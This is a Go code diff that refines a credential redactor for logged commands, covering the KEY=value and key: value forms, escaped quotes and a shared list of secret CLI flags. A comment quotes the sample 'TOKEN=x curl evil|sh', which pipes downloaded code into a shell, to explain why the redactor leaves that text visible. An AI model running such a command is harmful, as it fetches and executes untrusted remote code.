@@ -39,13 +39,31 @@ var secretPatterns = []*regexp.Regexp{
 	regexp.MustCompile(`://[^/\s:@]+:[^/\s@]+@`),
 }
 
-// assignmentPattern matches a credential key and its value. The key may
-// carry a prefix, as in GITHUB_TOKEN or OPENAI_API_KEY. A quoted value runs
-// to its closing quote. An unquoted value stops at the first whitespace or
-// any of ;&|"' so a trailing shell command (e.g. "TOKEN=x curl evil|sh")
-// stays visible as evidence instead of being swallowed into the redaction.
-// Only the value is replaced.
-var assignmentPattern = regexp.MustCompile(`(?i)((?:^|[^A-Za-z0-9])(?:[A-Za-z0-9]*[_-])*(?:password|passwd|api[_-]?key|token|secret)\b["']?\s*[=:]\s*)("[^"\n]*"|'[^'\n]*'|[^\s;&|"'\n]*)`)
+// quotedOrBareValue is one assignment value: a double-quoted string that
+// correctly skips an escaped quote (\"), so {"password":"a\"b"} redacts
+// the whole "a\"b" instead of stopping at the \" and leaking the b that
+// followed it; a single-quoted string (shell single quotes do not
+// support backslash escapes, so no \-skipping is needed there); or an
+// unquoted run, which the two assignmentPattern variants below bound
+// differently.
+const quotedValue = `"(?:[^"\\\n]|\\.)*"|'[^'\n]*'`
+
+// assignmentPatternEquals matches a shell-style KEY=value credential
+// assignment. The key may carry a prefix, as in GITHUB_TOKEN or
+// OPENAI_API_KEY. An unquoted value stops at the first whitespace or any
+// of ;&|"' so a trailing shell command (e.g. "TOKEN=x curl evil|sh")
+// stays visible as evidence instead of being swallowed into the
+// redaction: a shell would treat that first space the same way. Only the
+// value is replaced.
+var assignmentPatternEquals = regexp.MustCompile(`(?i)((?:^|[^A-Za-z0-9])(?:[A-Za-z0-9]*[_-])*(?:password|passwd|api[_-]?key|token|secret)\b["']?\s*=\s*)(` + quotedValue + `|[^\s;&|"'\n]*)`)
+
+// assignmentPatternColon matches a "key: value" credential line, as
+// opposed to shell-style KEY=value: a line such as "token: abc def" is
+// not shell syntax, so, unlike the "=" form, there is no shell word
+// boundary to preserve and an unquoted value runs to the end of the
+// line (or to one of ;&|"', in case the line is itself embedded in a
+// larger shell command).
+var assignmentPatternColon = regexp.MustCompile(`(?i)((?:^|[^A-Za-z0-9])(?:[A-Za-z0-9]*[_-])*(?:password|passwd|api[_-]?key|token|secret)\b["']?\s*:\s*)(` + quotedValue + `|[^;&|"'\n]*)`)
 
 // authorizationPattern matches an Authorization header or JSON field with a
 // Bearer, Basic, or token scheme, in both header ("Authorization: Bearer x")
@@ -53,34 +71,61 @@ var assignmentPattern = regexp.MustCompile(`(?i)((?:^|[^A-Za-z0-9])(?:[A-Za-z0-9
 // length-limited, and a closing quote is never consumed.
 var authorizationPattern = regexp.MustCompile(`(?i)(authorization["']?\s*:\s*["']?(?:bearer|basic|token)\s+)([^\s;&|"']+)`)
 
-// curlUserPattern matches curl's "-u user:pass" / "--user user:pass" inline
-// credential flag. Quotes around the value, if present, are preserved.
-var curlUserPattern = regexp.MustCompile(`(?i)((?:^|\s)(?:-u|--user)\s+)(['"]?)([^\s'";&|]+:[^\s'";&|]*)(['"]?)`)
+// SecretFlags lists the CLI flag spellings whose value is a credential:
+// curl's -u/--user ("user:pass"), and the --token/--secret/--password/
+// --api-key family, including the short -t/-k spellings several tools
+// accept. It is exported so the Claude Code adapter's own, first-line
+// flag redaction (parse.go's commandSecretFlag) recognizes exactly the
+// same flags as this second-line DefaultRedactor, instead of the two
+// lists drifting apart.
+var SecretFlags = []string{"-u", "--user", "-t", "--token", "-k", "--api-key", "--apikey", "--api_key", "--secret", "--password"}
+
+// SecretFlagAlternation returns SecretFlags as a regexp alternation
+// (flag1|flag2|...), each flag escaped with regexp.QuoteMeta.
+func SecretFlagAlternation() string {
+	parts := make([]string, len(SecretFlags))
+	for i, flag := range SecretFlags {
+		parts[i] = regexp.QuoteMeta(flag)
+	}
+	return strings.Join(parts, "|")
+}
+
+// secretFlagPattern matches a SecretFlags flag and its value in any shape
+// a CLI accepts: "--flag value" (space), "--flag=value" (equals), or,
+// glued with no separator at all for a single-letter short flag (for
+// example "-uuser:pass", curl's own documented short form). Group 1 is
+// the leading boundary, flag, and separator, kept as-is in the
+// replacement; groups 2 and 4 are a quote character around the value, if
+// present, also kept; group 3 is the value, replaced.
+var secretFlagPattern = regexp.MustCompile(`(?i)((?:^|\s)(?:` + SecretFlagAlternation() + `)(?:=|\s+|))(['"]?)([^\s'";&|]+)(['"]?)`)
 
 // DefaultRedactor replaces well-known credential shapes with [REDACTED].
 // Already-redacted text, such as "sk-***REDACTED***abcd", is unchanged.
 func DefaultRedactor(value string) string {
 	value = authorizationPattern.ReplaceAllString(value, "${1}"+redactedMarker)
-	value = curlUserPattern.ReplaceAllString(value, "${1}${2}"+redactedMarker+"${4}")
+	value = secretFlagPattern.ReplaceAllString(value, "${1}${2}"+redactedMarker+"${4}")
 	for _, pattern := range secretPatterns {
 		value = pattern.ReplaceAllString(value, redactedMarker)
 	}
-	return assignmentPattern.ReplaceAllStringFunc(value, redactAssignment)
+	value = assignmentPatternEquals.ReplaceAllStringFunc(value, redactAssignment(assignmentPatternEquals))
+	return assignmentPatternColon.ReplaceAllStringFunc(value, redactAssignment(assignmentPatternColon))
 }
 
-func redactAssignment(match string) string {
-	parts := assignmentPattern.FindStringSubmatch(match)
-	if len(parts) != 3 || placeholderSecret(parts[2]) {
-		return match
-	}
-	value := parts[2]
-	if len(value) >= 2 {
-		quote := value[0]
-		if (quote == '"' || quote == '\'') && value[len(value)-1] == quote {
-			return parts[1] + string(quote) + redactedMarker + string(quote)
+func redactAssignment(pattern *regexp.Regexp) func(string) string {
+	return func(match string) string {
+		parts := pattern.FindStringSubmatch(match)
+		if len(parts) != 3 || placeholderSecret(parts[2]) {
+			return match
 		}
+		value := parts[2]
+		if len(value) >= 2 {
+			quote := value[0]
+			if (quote == '"' || quote == '\'') && value[len(value)-1] == quote {
+				return parts[1] + string(quote) + redactedMarker + string(quote)
+			}
+		}
+		return parts[1] + redactedMarker
 	}
-	return parts[1] + redactedMarker
 }
 
 func placeholderSecret(value string) bool {
